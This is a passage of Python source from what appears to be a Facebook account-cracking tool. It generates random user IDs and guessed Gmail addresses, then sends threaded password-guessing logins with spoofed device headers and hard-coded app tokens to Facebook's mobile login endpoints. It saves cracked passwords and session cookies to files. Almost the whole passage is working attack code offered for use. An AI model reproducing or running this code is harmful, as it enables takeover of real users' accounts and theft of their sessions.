               ERROR.submit(ERROR3,ids,passlist)
            if mthd in ['4','04']:
               ERROR.submit(ERROR4,ids,passlist)
    print('\033[1;37m')
    linex()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ GMAIL CLONING ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def gmail():
    os.system('rm -rf .re.txt')
    clear()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE : Hamza, ali, sajjad, faizan')
    linex()
    first = input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PUT FIRST NAME : ')
    linex()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE : khan, ahmad, ali')
    linex()
    last = input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PUT LAST NAME : ')
    domain = "@gmail.com"
    linex()
    try:
        limit=int(input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PUT LIMIT : '))
    except ValueError:
        limit = 5000
    linex()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m GETTING GMAILS...')
    lists = ['3','4']
    for xd in range(limit):
        lchoice = random.choice(lists)
        if '3' in lchoice:
            mail = ''.join(random.choice(string.digits) for _ in range(3))
            open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
        else:
            mail = ''.join(random.choice(string.digits) for _ in range(4))
            open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
        fo = open('.re.txt', 'r').read().splitlines()
    with tred(max_workers=30) as XD:
        total = str(len(fo))
        clear()
        print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL ACCOUNT MAIL : \033[1;32m'+total)
        print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HIS BEEN STARTED ')
        linex()
        for user in fo:
            ids,names = user.split('|')
            first_name = names.rsplit(' ')[0]
            try:
                last_name = names.rsplit(' ')[1]
            except IndexError:
                last_name = 'Khan'
            fs = first_name.lower()
            ls = last_name.lower()
            passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
            XD.submit(ERROR1,ids,passlist)
    print('\033[1;37m')
    linex()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD CLONING ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_clone():
    clear()
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m ALL SERIES')
    print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m 100003/4/5/6 SERIES')
    print(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m 2009 SERIES')
    linex()
    _input = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ")
    if _input in ['1','01']:
        old_one()
    elif _input in ['2','02']:
        old_tow()
    elif _input in ['3','03']:
        old_tree()
    else:
        time.sleep(2)
        old_clone()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD ONE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_one():
    user = []
    clear()
    limit = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ")
    star = '10000'
    for _ in range(int(limit)):
        data=str(random.choice(range(1000000000,1999999999)))
        user.append(data)
    clear()
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD 1')
    print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m METHOD 2')
    print(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m METHOD 3')
    #print(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m] \x1b[1;97m METHOD 4')
    linex()
    meth = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ").strip().upper()
    with tred(max_workers=30) as pool:
        clear()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL ACCOUNT IDS : \033[1;32m{limit}')
        print(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;92m USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        for mal in user:
            uid=star+mal
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            elif meth == '3':
                pool.submit(login_3, uid)
            elif meth == '4':
                pool.submit(login_4, uid)
    print()
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK : \x1b[1;92m'+str(len(oks)))
    linex()
    input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    main()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD TOW ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_tow():
    user = []
    clear()
    limit = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LIMIT : ")
    prefixes = ['100003', '100004', '100005', '100006']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    clear()
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD 1')
    print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m METHOD 2')
    print(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m METHOD 3')
    #print(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m] \x1b[1;97m METHOD 4')
    linex()
    meth = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ").strip().upper()
    with tred(max_workers=30) as pool:
        clear()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL ACCOUNT IDS : \033[1;32m{limit}')
        print(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;92m USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            elif meth == '3':
                pool.submit(login_3, uid)
            elif meth == '4':
                pool.submit(login_4, uid)
    print()
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK : \x1b[1;92m'+str(len(oks)))
    linex()
    input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    main()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD TREE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_tree():
    user = []
    clear()
    limit = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LIMIT : ")
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    clear()
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD 1')
    print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m METHOD 2')
    print(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m METHOD 3')
    #print(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m] \x1b[1;97m METHOD 4')
    linex()
    meth = input(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ").strip().upper()
    with tred(max_workers=30) as pool:
        clear()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL ACCOUNT IDS : \033[1;32m{limit}')
        print(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;92m USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            elif meth == '3':
                pool.submit(login_3, uid)
            elif meth == '4':
                pool.submit(login_4, uid)
    print()
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK : \x1b[1;92m'+str(len(oks)))
    linex()
    input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    main()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def login_1(uid):
    global loop,oks,cps
    session = requests.session()
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M1\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f'\r\r\x1b[1;92m[ERROR-OK💚] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M1-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f'\r\r\x1b[1;92m[ERROR-OK💚] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M1-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def login_2(uid):
    global loop,oks,cps
    session = requests.Session()
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M2\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ug2(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger',
            }
            params = {
                'format': 'json',
                'email': str(uid),
                'password': str(pw),
                'credentials_type': 'device_based_login_password',
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
                'method': 'GET',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'fb_api_req_friendly_name': 'authenticate',
                'cpl': 'true',
            }
            response = session.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers).json()
            if 'session_key' in response or 'EAAA' in str(response):
                print(f'\r\r\x1b[1;92m[ERROR-OK💚] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M2-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
            elif 'session_key' in response or 'Please Confirm Email' in str(response):
                print(f'\r\r\x1b[1;92m[ERROR-OK💚] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M2-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def login_3(uid):
    global loop,oks,cps
    session = requests.session()
    color = random.choice([P,M,H,K,B,U,O,N])
    sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M3\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': ug1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f'\r\r\x1b[1;92m[ERROR-OK💚] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M3-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f'\r\r\x1b[1;92m[ERROR-OK💚] '+uid+f' | '+pw+f' |'+ashaa(uid)+'')
                open('/sdcard/ERROR-ZONE/ERROR-OLD-M3-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M1\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/296.0.0.17.137;FBBV/21810039;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/368298519;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-R910;FBSV/5;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": _____UpDaTe_S1_____(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[ERROR-OK💚] '+ids+' | '+pas)
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M1-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api1(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M2\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636690;FBDM/{density=2.0,width=720,height=1184};FBLC/es_ES;FBRV/208541728;FBCR/TELCEL;FBMF/ZENEK;FBBD/ZENEK;FBPN/com.facebook.katana;FBDV/Libelula Z6001;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
